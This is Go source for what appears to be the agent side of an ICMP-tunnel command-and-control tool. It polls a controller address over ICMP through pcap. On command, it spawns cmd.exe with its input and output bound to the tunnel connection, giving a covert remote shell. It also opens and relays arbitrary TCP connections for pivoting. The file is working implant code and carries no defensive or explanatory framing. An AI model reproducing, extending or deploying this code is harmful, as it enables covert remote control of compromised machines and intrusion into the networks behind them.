package main

import (
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"time"

	"context"

	"protocol/icmp/internal/app"
	"protocol/icmp/internal/protocol"
	"protocol/icmp/internal/shell"
	"protocol/icmp/internal/stdio"
	"protocol/icmp/internal/transport"
	"protocol/icmp/internal/tunnel"
)

const (
	DefaultDelay       = 200
	DefaultTimeout     = 3000
	DefaultMaxBlanks   = 10
	DefaultMaxDataSize = 64
)

type slaveConfig struct {
	target      string
	isTest      bool
	delay       int
	timeout     int
	maxBlanks   int
	maxDataSize int
}

var buildSlaveRuntime = func(cfg slaveConfig) (serviceRunner, io.Closer, error) {
	executor, err := shell.NewCmdShell(cfg.maxDataSize)
	if err != nil {
		return nil, nil, fmt.Errorf("create shell error: %w", err)
	}

	tunnelListener := &transport.TunnelListener{
		TargetIP: cfg.target,
		Resolver: transport.OSResolver{},
	}

	tunnelManager := tunnel.NewTunnelManager(func(ctx context.Context, payload []byte) error {
		return tunnelListener.SendAsync(append([]byte{protocol.ProtocolTunnel}, payload...))
	})
	tunnelManager.OnSYN = func(conn net.Conn, payload []byte) {
		if len(payload) == 0 {
			conn.Close()
			return
		}
		cmd := payload[0]
		switch cmd {
		case protocol.CmdShell:
			// Run OS Shell
			shell := "cmd.exe"
			c := exec.Command(shell)
			c.Stdin = conn
			c.Stdout = conn
			c.Stderr = conn
			_ = c.Start()
			go func() {
				_ = c.Wait()
				conn.Close()
			}()
		case protocol.CmdTCPDial:
			// Dial target TCP address
			target := string(payload[1:])
			tcpConn, err := net.Dial("tcp", target)
			if err != nil {
				conn.Close()
				return
			}
			go func() {
				_, _ = io.Copy(conn, tcpConn)
				conn.Close()
			}()
			go func() {
				_, _ = io.Copy(tcpConn, conn)
				tcpConn.Close()
			}()
		default:
			conn.Close()
		}
	}

	service := app.SlaveService{
		Config: app.SlaveConfig{
			Delay:    time.Duration(cfg.delay) * time.Millisecond,
			Timeout:  time.Duration(cfg.timeout) * time.Millisecond,
			TestMode: cfg.isTest,
			Logger:   stdio.WrapConsoleWriter(os.Stdout),
		},
		Client: transport.PcapPollClient{
			TargetIP: cfg.target,
			Timeout:  time.Duration(cfg.timeout) * time.Millisecond,
			Resolver: transport.OSResolver{},
			ID:       1,
			Seq:      1,
		},
		Executor:       executor,
		TunnelListener: tunnelListener,
		TunnelManager:  tunnelManager,
	}
	return service, executor, nil
}

func runSlave(cfg slaveConfig) error {
	fmt.Printf("启动配置 -> Target: %s, Delay: %d, TestMode: %v\n", cfg.target, cfg.delay, cfg.isTest)
	service, closer, err := buildSlaveRuntime(cfg)
	if err != nil {
		return err
	}
	if closer != nil {
		defer closer.Close()
	}
	return service.Run(context.Background())
}
